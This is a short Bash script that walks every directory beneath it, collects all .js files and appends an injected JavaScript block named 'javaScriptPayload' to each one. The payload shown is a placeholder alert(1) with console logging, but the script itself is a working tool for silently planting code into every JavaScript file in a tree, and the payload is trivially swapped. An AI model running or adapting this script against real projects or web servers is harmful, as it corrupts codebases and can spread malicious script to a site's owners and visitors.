# A BASH script that will find all .js files in directories beneath it and append JavaScript into each one
#!/bin/bash

declare -a fileArray
declare -a directoryArray

while read line
do
	fileArray+=("$line")

done < <(find . -type f -name '*.js' 2>/dev/null |  awk -F: '{print $1}')

# Make sure we're looking at unique files
while read uniqFile
do
	echo "Unique file: $uniqFile"
	echo 
	echo >> $uniqFile
	echo "if (typeof javaScriptPayload === 'undefined')
	{
		var javaScriptPayload = function()
		{
			console.log('++Running this code!');
			alert(1);
		} 
		javaScriptPayload();
	} 
else
	{
		console.log('--Not running this code'); 
	}" >> $uniqFile

done < <(printf "%s\n" "${fileArray[@]}" | sort -u)	##
